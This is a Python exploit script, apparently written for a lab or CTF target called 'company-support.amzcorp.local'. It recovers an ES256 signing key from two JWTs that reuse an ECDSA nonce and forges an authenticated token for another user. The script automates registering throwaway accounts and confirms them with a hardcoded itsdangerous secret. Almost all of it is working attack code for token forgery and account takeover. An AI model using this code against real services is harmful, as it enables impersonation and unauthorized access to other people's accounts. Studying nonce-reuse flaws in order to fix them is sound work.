#!/usr/bin/env python3
"""ECDSA nonce-reuse attack on company-support custom JWT (ES256)."""
import argparse
import os
import base64
import hashlib
import json
import re
import sys

import requests
from ecdsa.ecdsa import Private_key, Public_key, Signature, generator_256
from itsdangerous import URLSafeSerializer

G = generator_256
N = G.order()
BASE = "http://company-support.amzcorp.local"


def unb64(data: str) -> bytes:
    pad = 4 - len(data) % 4
    if pad != 4:
        data += "=" * pad
    return base64.urlsafe_b64decode(data)


def b64(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip("=")


def bytes_to_long(b: bytes) -> int:
    return int.from_bytes(b, "big")


def long_to_bytes(n: int) -> bytes:
    length = (n.bit_length() + 7) // 8 or 1
    return n.to_bytes(length, "big")


def parse_jwt(jwt: str):
    header_b64, data_b64, sig_b64 = jwt.split(".")
    sig_int = bytes_to_long(unb64(sig_b64))
    r = sig_int >> 256
    s = sig_int % (2**256)
    msg_recovery = f"{header_b64}.{data_b64}"
    h_recovery = bytes_to_long(hashlib.sha256(msg_recovery.encode()).digest())
    payload = json.loads(unb64(data_b64))
    return header_b64, data_b64, payload, r, s, h_recovery


def recover_key(jwt1: str, jwt2: str):
    _, _, _, r1, s1, h1 = parse_jwt(jwt1)
    _, _, _, r2, s2, h2 = parse_jwt(jwt2)
    if r1 != r2:
        raise ValueError(f"r mismatch: {hex(r1)[:18]} != {hex(r2)[:18]}")
    r = r1
    d = (((s2 * h1) - (s1 * h2)) * pow(r * (s1 - s2), -1, N)) % N
    k = ((h1 - h2) * pow(s1 - s2, -1, N)) % N
    pubkey = Public_key(G, G * d)
    privkey = Private_key(pubkey, d)
    return privkey, k, r, pubkey


def create_jwt(data: dict, privkey, k: int) -> str:
    header = {"alg": "ES256"}
    header_b64 = b64(json.dumps(header, separators=(",", ":")).encode())
    data_b64 = b64(json.dumps(data, separators=(",", ":")).encode())
    msg = f"{header_b64}.{data_b64}".replace("=", "")
    h = bytes_to_long(hashlib.sha256(msg.encode()).digest())
    sig = privkey.sign(h, k)
    sig_b64 = b64(long_to_bytes((sig.r << 256) + sig.s)).replace("=", "")
    return f"{header_b64}.{data_b64}.{sig_b64}".replace("=", "")


def verify_jwt(jwt: str, pubkey) -> bool:
    header_b64, data_b64, sig_b64 = jwt.split(".")
    sig_int = bytes_to_long(unb64(sig_b64))
    signature = Signature(sig_int >> 256, sig_int % (2**256))
    msghash = bytes_to_long(hashlib.sha256(f"{header_b64}.{data_b64}".encode()).digest())
    return pubkey.verifies(msghash, signature)


def get_csrf(html: str) -> str:
    m = re.search(r'name="csrf_token"[^>]*value="([^"]+)"', html)
    if not m:
        m = re.search(r'csrf_token" type="hidden" value="([^"]+)"', html)
    return m.group(1)


def register_and_login(username: str, password: str = "") -> str:
    s = requests.Session()
    r = s.get(f"{BASE}/register")
    csrf = get_csrf(r.text)
    s.post(
        f"{BASE}/register",
        data={
            "csrf_token": csrf,
            "username": username,
            "email": f"{username}@test.local",
            "password": password,
            "register": "Sign UP",
        },
    )
    key = URLSafeSerializer("serliaizer_code").dumps([username, f"{username}@test.local"])
    s.get(f"{BASE}/confirm_account/{key}")
    r = s.get(f"{BASE}/login")
    csrf = get_csrf(r.text)
    s.post(
        f"{BASE}/login",
        data={"csrf_token": csrf, "username": username, "password": password, "login": "Sign IN"},
        allow_redirects=True,
    )
    return s.cookies.get("aws_auth")


def main():
    parser = argparse.ArgumentParser(description="Forge company-support JWT via ECDSA nonce reuse")
    parser.add_argument("jwt1", nargs="?", help="First JWT sample")
    parser.add_argument("jwt2", nargs="?", help="Second JWT sample")
    parser.add_argument("--username", default="tony")
    parser.add_argument("--email", default="tony@amzcorp.local")
    parser.add_argument("--fresh", action="store_true", help="Register 2 fresh users for samples")
    args = parser.parse_args()

    if args.fresh:
        import random
        import string

        u1 = "jwt" + "".join(random.choices(string.digits, k=5))
        u2 = "jwt" + "".join(random.choices(string.digits, k=5))
        j1 = register_and_login(u1)
        j2 = register_and_login(u2)
        print(f"[+] Fresh users: {u1}, {u2}", file=sys.stderr)
    elif args.jwt1 and args.jwt2:
        j1, j2 = args.jwt1, args.jwt2
    else:
        with open("artifacts/jwt_samples.txt") as f:
            lines = [line.strip() for line in f if line.strip()]
        j1, j2 = lines[0], lines[1]

    privkey, k, r, pubkey = recover_key(j1, j2)
    print(f"[+] Recovered key; shared r={hex(r)[:20]}...", file=sys.stderr)

    data = {"username": args.username, "email": args.email, "account_status": True}
    forged = create_jwt(data, privkey, k)
    ok = verify_jwt(forged, pubkey)
    print(f"[+] Local verify: {ok}", file=sys.stderr)
    print(forged)


if __name__ == "__main__":
    main()
